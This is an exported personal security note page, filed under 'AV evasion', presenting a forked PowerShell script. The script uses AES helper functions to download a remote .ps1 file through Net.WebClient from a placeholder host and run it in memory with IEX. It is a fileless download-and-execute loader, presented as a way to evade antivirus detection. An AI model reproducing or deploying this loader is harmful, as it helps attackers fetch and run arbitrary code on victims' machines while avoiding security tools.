<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PowershellAES (fork)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>PowershellAES (fork)</h1><br />Github: <a
      href="https://gist.github.com/ctigeek/2a56648b923d198a6e60" target="_blank">https://gist.github.com/ctigeek/2a56648b923d198a6e60</a><br /><br />My
    fork that execute in memory ps1 scripts<br /> ◇ you can find the file on my github: <a
      href="https://github.com/DenFox93/PowershellAES/blob/main/PowershellAes.ps1" target="_blank">https://github.com/DenFox93/PowershellAES/blob/main/PowershellAes.ps1</a><br />
    ◇ <a href="file://C:/CherryTree/Files/network security/exploitation/AV evasion/PowershellAes.zip" target="_blank">In the
      notes</a><br />
    <div class="codebox">
      <div class="codebox">
        function&nbsp;Create-AesManagedObject($key,&nbsp;$IV)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged&nbsp;=&nbsp;New-Object&nbsp;&quot;System.Security.Cryptography.AesManaged&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.Mode&nbsp;=&nbsp;[System.Security.Cryptography.CipherMode]::CBC<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.Padding&nbsp;=&nbsp;[System.Security.Cryptography.PaddingMode]::Zeros<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.BlockSize&nbsp;=&nbsp;128<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.KeySize&nbsp;=&nbsp;256<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($IV)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($IV.getType().Name&nbsp;-eq&nbsp;&quot;String&quot;)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.IV&nbsp;=&nbsp;[System.Convert]::FromBase64String($IV)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.IV&nbsp;=&nbsp;$IV<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($key)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($key.getType().Name&nbsp;-eq&nbsp;&quot;String&quot;)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.Key&nbsp;=&nbsp;[System.Convert]::FromBase64String($key)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.Key&nbsp;=&nbsp;$key<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged<br />}<br /><br />function&nbsp;Create-AesKey()&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged&nbsp;=&nbsp;Create-AesManagedObject<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.GenerateKey()<br />&nbsp;&nbsp;&nbsp;&nbsp;[System.Convert]::ToBase64String($aesManaged.Key)<br />}<br /><br />function&nbsp;Encrypt-String($key,&nbsp;$unencryptedString)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;$bytes&nbsp;=&nbsp;[System.Text.Encoding]::UTF8.GetBytes($unencryptedString)<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged&nbsp;=&nbsp;Create-AesManagedObject&nbsp;$key<br />&nbsp;&nbsp;&nbsp;&nbsp;$encryptor&nbsp;=&nbsp;$aesManaged.CreateEncryptor()<br />&nbsp;&nbsp;&nbsp;&nbsp;$encryptedData&nbsp;=&nbsp;$encryptor.TransformFinalBlock($bytes,&nbsp;0,&nbsp;$bytes.Length);<br />&nbsp;&nbsp;&nbsp;&nbsp;[byte[]]&nbsp;$fullData&nbsp;=&nbsp;$aesManaged.IV&nbsp;+&nbsp;$encryptedData<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.Dispose()<br />&nbsp;&nbsp;&nbsp;&nbsp;[System.Convert]::ToBase64String($fullData)<br />}<br /><br />function&nbsp;Decrypt-String($key,&nbsp;$encryptedStringWithIV)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;$bytes&nbsp;=&nbsp;[System.Convert]::FromBase64String($encryptedStringWithIV)<br />&nbsp;&nbsp;&nbsp;&nbsp;$IV&nbsp;=&nbsp;$bytes[0..15]<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged&nbsp;=&nbsp;Create-AesManagedObject&nbsp;$key&nbsp;$IV<br />&nbsp;&nbsp;&nbsp;&nbsp;$decryptor&nbsp;=&nbsp;$aesManaged.CreateDecryptor();<br />&nbsp;&nbsp;&nbsp;&nbsp;$unencryptedData&nbsp;=&nbsp;$decryptor.TransformFinalBlock($bytes,&nbsp;16,&nbsp;$bytes.Length&nbsp;-&nbsp;16);<br />&nbsp;&nbsp;&nbsp;&nbsp;$aesManaged.Dispose()<br />&nbsp;&nbsp;&nbsp;&nbsp;[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)<br />}<br /><br />$key&nbsp;=&nbsp;Create-AesKey<br />$key<br />$unencryptedString&nbsp;=&nbsp;(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://192.168.1.1333/file.ps1&nbsp;&#39;)<br />$encryptedString&nbsp;=&nbsp;Encrypt-String&nbsp;$key&nbsp;$unencryptedString<br />$backToPlainText&nbsp;=&nbsp;Decrypt-String&nbsp;$key&nbsp;$encryptedString<br />IEX($backToPlainText)<br />
      </div>
    </div><br />
  </div>
</body>

</html>